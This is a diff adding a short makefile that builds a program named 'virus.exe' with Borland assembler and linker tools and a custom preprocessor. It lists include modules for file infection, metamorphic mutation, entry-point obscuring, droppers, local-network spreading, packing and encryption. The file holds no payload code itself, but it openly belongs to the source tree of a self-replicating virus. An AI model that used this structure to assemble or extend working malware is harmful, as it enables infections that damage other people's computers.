@@ -1,0 +1,19 @@
+virus.exe : virus.obj
+
+          tlink32 virus.obj
+          pewrsec virus.exe
+          tdump virus.exe virus.dmp
+
+virus.obj : virus.a
+
+          tasm32 /m /l /z /w- virus.a
+
+virus.a : virus.asm \
+          data.asi main.asi \
+          insert.inc map.inc disasm.inc import.inc lexo32.inc rebuild.inc \
+          infectf.inc hash.inc metamorp.inc export.inc \
+          rnd.inc z_decode.inc z_encode.inc search.inc \
+          localnet.inc droppers.inc exepack.inc epo.inc \
+          mix_var.inc hybris.inc xtea.inc hash128.inc rsalib.inc
+
+  	  prepro\preproc.exe virus.asm virus.a
